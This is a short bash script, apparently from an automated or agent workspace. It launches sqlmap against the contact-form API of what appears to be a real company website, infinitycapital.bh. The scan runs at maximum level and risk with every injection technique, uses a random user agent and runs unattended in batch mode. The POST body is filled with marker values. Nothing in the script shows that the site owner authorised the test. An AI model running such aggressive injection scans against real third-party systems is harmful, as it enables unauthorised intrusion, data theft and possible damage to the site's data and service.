#!/bin/bash
cd /work
U="https://www.infinitycapital.bh/api/send"
D='fname=ICMARKER7&lname=Tester&areacode=973&tel=3612345&cname=ICMARKER7&subject=ICMARKER7&msg=ICMARKER7+body&check=on&targets=delivered%40resend.dev'
mkdir -p tool_outputs/sqlmap_send2
exec sqlmap -u "$U" --data="$D" --method=POST \
  --batch --level=5 --risk=3 --threads=4 \
  --random-agent --timeout=25 --retries=2 --delay=0.6 \
  --technique=BEUSTQ \
  --output-dir=/work/tool_outputs/sqlmap_send2 \
  > /work/tool_outputs/sqlmap_send_run.log 2>&1
